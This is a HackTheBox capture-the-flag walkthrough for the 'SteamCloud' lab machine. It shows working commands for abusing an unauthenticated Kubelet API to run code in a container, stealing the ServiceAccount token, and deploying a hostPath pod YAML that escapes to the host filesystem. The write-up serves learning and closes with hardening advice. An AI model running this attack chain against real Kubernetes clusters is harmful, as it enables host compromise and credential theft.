# SteamCloud — HackTheBox Walkthrough

**Machine:** SteamCloud  
**OS:** Linux  
**Difficulty:** Easy  
**Key Topics:** Kubernetes, Kubelet API, Container Escape, Pod Volume Mount

---

## Nmap Scan

```
./nmapAutomator.sh 10.129.96.167 -t All

Running all scans on 10.129.96.167

---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
22/tcp   open  ssh
8443/tcp open  https-alt

---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
8443/tcp open  ssl/http Golang net/http server
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal,
|   DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc,
|   DNS:kubernetes.default, DNS:kubernetes, DNS:localhost,
|   IP Address:10.129.96.167, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
```

The initial scan only showed two ports, but the **full port scan** revealed several more Kubernetes-related services:

```
---------------------Starting Full Scan------------------------

PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown
```

The SSL certificate on port 8443 immediately gives away what we're dealing with — the CN is `minikube` and the org is `system:masters`. This is a **Kubernetes cluster** running on minikube. The additional ports confirm this: 2379/2380 are etcd (Kubernetes' key-value store), 8443 is the Kubernetes API server, and 10250 is the **Kubelet API** (the agent that manages individual nodes).

The Kubernetes API on 8443 blocks anonymous access with 403 responses, so we can't interact with it directly using `kubectl` without credentials. But port 10250 (the Kubelet) is a different story — it might allow unauthenticated access, which would let us interact with the pods running on this node.

---

## Kubelet Enumeration

### Listing Pods

Using `kubeletctl`, a tool specifically designed for interacting with the Kubelet API, I listed all pods running on this node:

```bash
kubeletctl -s 10.129.96.167 pods
```

![kubeletctl pods listing showing 8 running pods](./Cloud_Imgs/Pasted%20image%2020260714143902.png)

The Kubelet accepted our request without any authentication — that's a significant misconfiguration. We can see 8 pods running, most of them are standard kube-system components (etcd, apiserver, controller-manager, scheduler, proxy, coredns, storage-provisioner). The interesting one is the **nginx** pod in the `default` namespace — that's the only user-deployed pod.

### Scanning for RCE

`kubeletctl` has a built-in `scan rce` command that checks which pods/containers allow remote code execution through the Kubelet API:

```bash
kubeletctl -s 10.129.96.167 scan rce
```

![kubeletctl RCE scan showing nginx and kube-proxy are exploitable](./cloud_Imgs/Pasted%20image%2020260714144328.png)

The scan shows that the **nginx** container (and kube-proxy) have RCE enabled — meaning we can execute arbitrary commands inside them through the unauthenticated Kubelet API. This is the entry point.

---

## Initial Access — RCE in Nginx Container

### Command Execution

First, I confirmed we have root access inside the nginx container:

```bash
kubeletctl -s 10.129.96.167 exec "id" -p nginx -c nginx
# uid=0(root) gid=0(root) groups=0(root)
```

Then I dropped into a full bash shell:

```bash
kubeletctl -s 10.129.96.167 exec "/bin/bash" -p nginx -c nginx
```

![Shell access in the nginx container as root](./cloud_Imgs/Pasted%20image%2020260714144633.png)

We're root inside the nginx container. This isn't root on the actual host yet — it's root inside a container, which is an important distinction. But it's enough to grab the user flag.

### User Flag

![User flag found in /root/user.txt inside the nginx container](./cloud_Imgs/Pasted%20image%2020260714144728.png)

---

## Privilege Escalation — Container Escape via Kubernetes API

Being root inside a container is nice, but we need to escape to the host. The strategy here is to leverage Kubernetes itself: if we can authenticate to the K8s API, we might be able to create a new pod that mounts the host's entire filesystem, giving us full access.

### Extracting ServiceAccount Credentials

Every pod in Kubernetes has a **ServiceAccount** that provides it with an identity. The associated credentials (a CA certificate and a JWT token) are automatically mounted inside the container. These are exactly what we need to authenticate to the Kubernetes API.

I found them at the standard path and also used `kubectl` from my attack machine to check what permissions this service account has:

```bash
# Inside the container:
ls /run/secrets/kubernetes.io/serviceaccount
# ca.crt  namespace  token

cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /run/secrets/kubernetes.io/serviceaccount/token
```

![ServiceAccount credentials, kubectl get pod, and kubectl auth can-i output](./cloud_Imgs/Pasted%20image%2020260714145505.png)

I saved the `ca.crt` and `token` to my local machine, then used them to authenticate with `kubectl`:

```bash
export token=$(cat token)
kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token get pod
```

This worked — we can now talk to the Kubernetes API. The `auth can-i --list` output shows that this service account can **get**, **create**, and **list** pods. That's exactly the permission we need to deploy a malicious pod.

### Inspecting the Existing Pod

Before creating our own pod, I inspected the nginx pod's YAML spec to understand the cluster configuration — specifically what image is available and what namespace to use:

```bash
kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token get pod nginx -o yaml
```

![kubectl get pod nginx -o yaml showing pod specification](./cloud_Imgs/Pasted%20image%2020260714150105.png)

Key details from the output: the namespace is `default`, the image is `nginx:1.14.2` with `imagePullPolicy: Never` (meaning the image must already exist locally — no pulling from registries), and the existing pod already mounts a host path (`/opt/flag`) into `/root`. This confirms that hostPath volumes work in this cluster.

![Pod YAML specification details](./cloud_Imgs/Pasted%20image%2020260714150221.png)

### Creating a Malicious Pod

Now for the escape. I created a pod YAML spec that mounts the **entire host filesystem** (`/`) into the container at `/mnt`. This means once we exec into this pod, we can access everything on the host through `/mnt`:

```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: aziz-pod
  namespace: default
spec:
  containers:
  - name: aziz-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

The critical parts here: `hostPath: path: /` maps the host's root filesystem as a volume, and `volumeMounts` makes it accessible inside the container at `/mnt`. The `hostNetwork: true` gives the pod access to the host's network stack too.

![Deploying the malicious pod with kubectl apply](./cloud_Imgs/Pasted%20image%2020260714150725.png)

One gotcha I hit — Kubernetes pod names must be lowercase RFC 1123 subdomains. My initial YAML had `Aziz-pod` (uppercase A), which got rejected. After fixing it to `aziz-pod`, the pod was created successfully:

```bash
kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token apply -f my_pod.yaml
# pod/aziz-pod created
```

![kubectl apply succeeding and kubeletctl showing the new pod](./cloud_Imgs/Pasted%20image%2020260714151036.png)

Verifying with `kubeletctl`, the new pod shows up in the pod listing alongside the original nginx pod:

![kubeletctl pods showing aziz-pod running in default namespace](./cloud_Imgs/Pasted%20image%2020260714151144.png)

### Root Flag

Now I exec'd into the new pod and navigated to `/mnt`, which is the host's root filesystem:

```bash
kubeletctl --server 10.129.96.167 exec "/bin/bash" -p aziz-pod -c aziz-pod
cd /mnt
ls
# bin  boot  dev  etc  home  initrd.img  ...  root  ...
cd root
cat root.txt
```

![Root flag obtained through the host filesystem mounted at /mnt](./cloud_Imgs/Pasted%20image%2020260714151339.png)

The `/mnt` directory contains the entire host filesystem — `bin`, `boot`, `etc`, `root`, everything. Navigating to `/mnt/root` gives us the root flag on the actual host, not just inside a container.

---

## Summary

This box demonstrates a realistic Kubernetes attack chain:

1. **Unauthenticated Kubelet API (port 10250):** The Kubelet was exposed without authentication, allowing us to list pods and execute commands inside containers. This gave us root inside the nginx container and the user flag.

2. **ServiceAccount Token Abuse:** From inside the container, we extracted the mounted ServiceAccount credentials (ca.crt + JWT token) which let us authenticate to the Kubernetes API server on port 8443.

3. **Malicious Pod with hostPath Volume Mount:** The service account had permissions to create pods, so we deployed a new pod that mounted the host's entire root filesystem (`/`) into the container. Exec'ing into this pod gave us full access to the host filesystem, including the root flag.

The core lesson: Kubernetes security depends on locking down every layer. An unauthenticated Kubelet is all it takes to start a chain that leads to full host compromise. In production, Kubelet authentication should always be enabled, and ServiceAccount permissions should follow the principle of least privilege.
